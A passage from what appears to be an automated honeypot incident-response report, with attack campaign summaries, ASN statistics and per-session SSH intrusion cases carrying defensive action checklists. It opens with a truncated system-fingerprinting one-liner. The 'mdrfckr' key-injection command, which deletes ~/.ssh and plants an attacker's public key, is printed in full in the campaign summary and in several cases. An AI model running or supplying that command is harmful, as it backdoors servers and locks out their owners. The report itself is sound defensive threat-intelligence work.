export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `2.57.122.168`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `177.30.68.202`, `165.154.255.63`, `45.177.147.146`, `180.76.236.214`, `103.213.238.91`, `107.180.88.176`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **71** |
| Unique ASNs | **36** |
| High-Risk ASNs | **20** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 32 | HIGH |
| `AS396982` | Google LLC | 3 | LOW |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS16629` | CTC. CORP S.A. (TELEFONICA EMPRESAS) | 1 | HIGH |
| `AS19108` | Optimum | 1 | LOW |
| `AS202412` | Omegatech LTD | 1 | HIGH |
| `AS22927` | Telefonica de Argentina | 1 | LOW |
| `AS24940` | Hetzner Online GmbH | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (327)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-46d7fe2a92e8

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-09-05 15:05 |
| **Last Seen** | 2026-09-05 15:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 15:05:55` | `cowrie.session.connect` |
| `2026-09-05 15:05:56` | `cowrie.client.version` |
| `2026-09-05 15:05:57` | `cowrie.client.kex` |
| `2026-09-05 15:05:57` | `cowrie.login.success` |
| `2026-09-05 15:05:58` | `cowrie.direct-tcpip.request` |
| `2026-09-05 15:05:58` | `cowrie.direct-tcpip.data` |
| `2026-09-05 15:05:58` | `cowrie.direct-tcpip.request` |
| `2026-09-05 15:05:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f8e11a7f95d

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-09-05 15:23 |
| **Last Seen** | 2026-09-05 15:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 15:23:37` | `cowrie.session.connect` |
| `2026-09-05 15:23:39` | `cowrie.client.version` |
| `2026-09-05 15:23:39` | `cowrie.client.kex` |
| `2026-09-05 15:23:40` | `cowrie.login.success` |
| `2026-09-05 15:23:40` | `cowrie.direct-tcpip.request` |
| `2026-09-05 15:23:40` | `cowrie.direct-tcpip.data` |
| `2026-09-05 15:23:41` | `cowrie.direct-tcpip.request` |
| `2026-09-05 15:23:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7eacf49c57e7

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-05 15:27 |
| **Last Seen** | 2026-09-05 15:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 15:27:40` | `cowrie.session.connect` |
| `2026-09-05 15:27:40` | `cowrie.client.version` |
| `2026-09-05 15:27:40` | `cowrie.client.kex` |
| `2026-09-05 15:27:41` | `cowrie.login.success` |
| `2026-09-05 15:27:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bbcd9588bea

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-05 15:27 |
| **Last Seen** | 2026-09-05 15:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 15:27:40` | `cowrie.session.connect` |
| `2026-09-05 15:27:40` | `cowrie.client.version` |
| `2026-09-05 15:27:40` | `cowrie.client.kex` |
| `2026-09-05 15:27:41` | `cowrie.login.success` |
| `2026-09-05 15:27:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5de5c7cdbdbf

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-09-05 15:28 |
| **Last Seen** | 2026-09-05 15:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 15:28:33` | `cowrie.session.connect` |
| `2026-09-05 15:28:34` | `cowrie.client.version` |
| `2026-09-05 15:28:34` | `cowrie.client.kex` |
| `2026-09-05 15:28:35` | `cowrie.login.success` |
| `2026-09-05 15:28:36` | `cowrie.direct-tcpip.request` |
| `2026-09-05 15:28:36` | `cowrie.direct-tcpip.data` |
| `2026-09-05 15:28:36` | `cowrie.direct-tcpip.request` |
| `2026-09-05 15:28:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90dd47ade6f2

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-09-05 15:46 |
| **Last Seen** | 2026-09-05 15:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 15:46:26` | `cowrie.session.connect` |
| `2026-09-05 15:46:28` | `cowrie.client.version` |
| `2026-09-05 15:46:28` | `cowrie.client.kex` |
| `2026-09-05 15:46:29` | `cowrie.login.success` |
| `2026-09-05 15:46:29` | `cowrie.direct-tcpip.request` |
| `2026-09-05 15:46:30` | `cowrie.direct-tcpip.data` |
| `2026-09-05 15:46:30` | `cowrie.direct-tcpip.request` |
| `2026-09-05 15:46:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1cb373345ef

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-09-05 15:51 |
| **Last Seen** | 2026-09-05 15:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 15:51:42` | `cowrie.session.connect` |
| `2026-09-05 15:51:45` | `cowrie.client.version` |
| `2026-09-05 15:51:45` | `cowrie.client.kex` |
| `2026-09-05 15:51:47` | `cowrie.login.success` |
| `2026-09-05 15:51:47` | `cowrie.direct-tcpip.request` |
| `2026-09-05 15:51:48` | `cowrie.direct-tcpip.data` |
| `2026-09-05 15:51:48` | `cowrie.direct-tcpip.request` |
| `2026-09-05 15:51:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7606a9d78ff5

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-05 15:53 |
| **Last Seen** | 2026-09-05 15:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 15:53:24` | `cowrie.session.connect` |
| `2026-09-05 15:53:24` | `cowrie.client.version` |
| `2026-09-05 15:53:25` | `cowrie.client.kex` |
| `2026-09-05 15:53:25` | `cowrie.login.success` |
| `2026-09-05 15:53:27` | `cowrie.direct-tcpip.request` |
| `2026-09-05 15:53:27` | `cowrie.direct-tcpip.ja4` |
| `2026-09-05 15:53:27` | `cowrie.direct-tcpip.data` |
| `2026-09-05 15:53:28` | `cowrie.direct-tcpip.request` |
| `2026-09-05 15:53:28` | `cowrie.direct-tcpip.ja4` |
| `2026-09-05 15:53:28` | `cowrie.direct-tcpip.data` |
| `2026-09-05 15:53:28` | `cowrie.direct-tcpip.request` |
| `2026-09-05 15:53:28` | `cowrie.direct-tcpip.ja4` |
| `2026-09-05 15:53:28` | `cowrie.direct-tcpip.data` |
| `2026-09-05 15:53:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a596eb093b61

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-05 15:58 |
| **Last Seen** | 2026-09-05 15:58 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 15:58:27` | `cowrie.session.connect` |
| `2026-09-05 15:58:27` | `cowrie.client.version` |
| `2026-09-05 15:58:27` | `cowrie.client.kex` |
| `2026-09-05 15:58:28` | `cowrie.login.success` |
| `2026-09-05 15:58:29` | `cowrie.direct-tcpip.request` |
| `2026-09-05 15:58:30` | `cowrie.direct-tcpip.ja4` |
| `2026-09-05 15:58:30` | `cowrie.direct-tcpip.data` |
| `2026-09-05 15:58:30` | `cowrie.direct-tcpip.request` |
| `2026-09-05 15:58:30` | `cowrie.direct-tcpip.ja4` |
| `2026-09-05 15:58:30` | `cowrie.direct-tcpip.data` |
| `2026-09-05 15:58:31` | `cowrie.direct-tcpip.request` |
| `2026-09-05 15:58:32` | `cowrie.direct-tcpip.ja4` |
| `2026-09-05 15:58:32` | `cowrie.direct-tcpip.data` |
| `2026-09-05 15:58:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5136b5e78b85

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-05 16:03 |
| **Last Seen** | 2026-09-05 16:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:03:32` | `cowrie.session.connect` |
| `2026-09-05 16:03:32` | `cowrie.client.version` |
| `2026-09-05 16:03:32` | `cowrie.client.kex` |
| `2026-09-05 16:03:32` | `cowrie.login.success` |
| `2026-09-05 16:03:32` | `cowrie.direct-tcpip.request` |
| `2026-09-05 16:03:32` | `cowrie.direct-tcpip.data` |
| `2026-09-05 16:03:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae1913fcbaf1

| Field | Detail |
|---|---|
| **Source IP** | `177.30.68[.]202` |
| **First Seen** | 2026-09-05 16:23 |
| **Last Seen** | 2026-09-05 16:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:23:58` | `cowrie.session.connect` |
| `2026-09-05 16:23:58` | `cowrie.client.version` |
| `2026-09-05 16:23:58` | `cowrie.client.kex` |
| `2026-09-05 16:23:59` | `cowrie.login.success` |
| `2026-09-05 16:24:00` | `cowrie.session.params` |
| `2026-09-05 16:24:00` | `cowrie.command.input` |
| `2026-09-05 16:24:00` | `cowrie.command.failed` |
| `2026-09-05 16:24:00` | `cowrie.log.closed` |
| `2026-09-05 16:24:01` | `cowrie.session.params` |
| `2026-09-05 16:24:01` | `cowrie.command.input` |
| `2026-09-05 16:24:01` | `cowrie.session.file_download` |
| `2026-09-05 16:24:01` | `cowrie.log.closed` |
| `2026-09-05 16:24:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.30.68[.]202` to AbuseIPDB if not already reported
- [ ] Block `177.30.68[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-484afdd17243

| Field | Detail |
|---|---|
| **Source IP** | `177.30.68[.]202` |
| **First Seen** | 2026-09-05 16:24 |
| **Last Seen** | 2026-09-05 16:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:24:01` | `cowrie.session.connect` |
| `2026-09-05 16:24:01` | `cowrie.client.version` |
| `2026-09-05 16:24:01` | `cowrie.client.kex` |
| `2026-09-05 16:24:02` | `cowrie.login.success` |
| `2026-09-05 16:24:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.30.68[.]202` to AbuseIPDB if not already reported
- [ ] Block `177.30.68[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51abf453e396

| Field | Detail |
|---|---|
| **Source IP** | `177.30.68[.]202` |
| **First Seen** | 2026-09-05 16:24 |
| **Last Seen** | 2026-09-05 16:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:24:02` | `cowrie.session.connect` |
| `2026-09-05 16:24:02` | `cowrie.client.version` |
| `2026-09-05 16:24:02` | `cowrie.client.kex` |
| `2026-09-05 16:24:03` | `cowrie.login.success` |
| `2026-09-05 16:24:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.30.68[.]202` to AbuseIPDB if not already reported
- [ ] Block `177.30.68[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1921c32125d

| Field | Detail |
|---|---|
| **Source IP** | `116.203.18[.]194` |
| **First Seen** | 2026-09-05 16:29 |
| **Last Seen** | 2026-09-05 16:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:29:05` | `cowrie.session.connect` |
| `2026-09-05 16:29:05` | `cowrie.client.version` |
| `2026-09-05 16:29:05` | `cowrie.client.kex` |
| `2026-09-05 16:29:06` | `cowrie.login.success` |
| `2026-09-05 16:29:07` | `cowrie.session.params` |
| `2026-09-05 16:29:07` | `cowrie.command.input` |
| `2026-09-05 16:29:07` | `cowrie.command.failed` |
| `2026-09-05 16:29:07` | `cowrie.log.closed` |
| `2026-09-05 16:29:08` | `cowrie.session.params` |
| `2026-09-05 16:29:08` | `cowrie.command.input` |
| `2026-09-05 16:29:08` | `cowrie.session.file_download` |
| `2026-09-05 16:29:08` | `cowrie.log.closed` |
| `2026-09-05 16:29:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.203.18[.]194` to AbuseIPDB if not already reported
- [ ] Block `116.203.18[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0a81d0eb086

| Field | Detail |
|---|---|
| **Source IP** | `116.203.18[.]194` |
| **First Seen** | 2026-09-05 16:29 |
| **Last Seen** | 2026-09-05 16:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:29:08` | `cowrie.session.connect` |
| `2026-09-05 16:29:08` | `cowrie.client.version` |
| `2026-09-05 16:29:08` | `cowrie.client.kex` |
| `2026-09-05 16:29:08` | `cowrie.login.success` |
| `2026-09-05 16:29:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.203.18[.]194` to AbuseIPDB if not already reported
- [ ] Block `116.203.18[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-445010da90e0

| Field | Detail |
|---|---|
| **Source IP** | `116.203.18[.]194` |
| **First Seen** | 2026-09-05 16:29 |
| **Last Seen** | 2026-09-05 16:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:29:09` | `cowrie.session.connect` |
| `2026-09-05 16:29:09` | `cowrie.client.version` |
| `2026-09-05 16:29:09` | `cowrie.client.kex` |
| `2026-09-05 16:29:09` | `cowrie.login.success` |
| `2026-09-05 16:29:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.203.18[.]194` to AbuseIPDB if not already reported
- [ ] Block `116.203.18[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0668f21e5125

| Field | Detail |
|---|---|
| **Source IP** | `152.89.12[.]101` |
| **First Seen** | 2026-09-05 16:30 |
| **Last Seen** | 2026-09-05 16:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:30:06` | `cowrie.session.connect` |
| `2026-09-05 16:30:06` | `cowrie.client.version` |
| `2026-09-05 16:30:06` | `cowrie.client.kex` |
| `2026-09-05 16:30:07` | `cowrie.login.success` |
| `2026-09-05 16:30:08` | `cowrie.session.params` |
| `2026-09-05 16:30:08` | `cowrie.command.input` |
| `2026-09-05 16:30:08` | `cowrie.command.failed` |
| `2026-09-05 16:30:08` | `cowrie.log.closed` |
| `2026-09-05 16:30:09` | `cowrie.session.params` |
| `2026-09-05 16:30:09` | `cowrie.command.input` |
| `2026-09-05 16:30:09` | `cowrie.session.file_download` |
| `2026-09-05 16:30:09` | `cowrie.log.closed` |
| `2026-09-05 16:30:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.12[.]101` to AbuseIPDB if not already reported
- [ ] Block `152.89.12[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-003c10a894a7

| Field | Detail |
|---|---|
| **Source IP** | `152.89.12[.]101` |
| **First Seen** | 2026-09-05 16:30 |
| **Last Seen** | 2026-09-05 16:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:30:09` | `cowrie.session.connect` |
| `2026-09-05 16:30:09` | `cowrie.client.version` |
| `2026-09-05 16:30:09` | `cowrie.client.kex` |
| `2026-09-05 16:30:10` | `cowrie.login.success` |
| `2026-09-05 16:30:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.12[.]101` to AbuseIPDB if not already reported
- [ ] Block `152.89.12[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76acc2f50cd3

| Field | Detail |
|---|---|
| **Source IP** | `152.89.12[.]101` |
| **First Seen** | 2026-09-05 16:30 |
| **Last Seen** | 2026-09-05 16:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 16:30:10` | `cowrie.session.connect` |
| `2026-09-05 16:30:10` | `cowrie.client.version` |
| `2026-09-05 16:30:11` | `cowrie.client.kex` |
| `2026-09-05 16:30:11` | `cowrie.login.success` |
| `2026-09-05 16:30:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.12[.]101` to AbuseIPDB if not already reported
- [ ] Block `152.89.12[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f77c62549605

| Field | Detail |
|---|---|
| **Source IP** | `156.235.89[.]172` |
| **First Seen** | 2026-09-05 16:32 |
| **Last Seen** | 2026-09-05 16:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
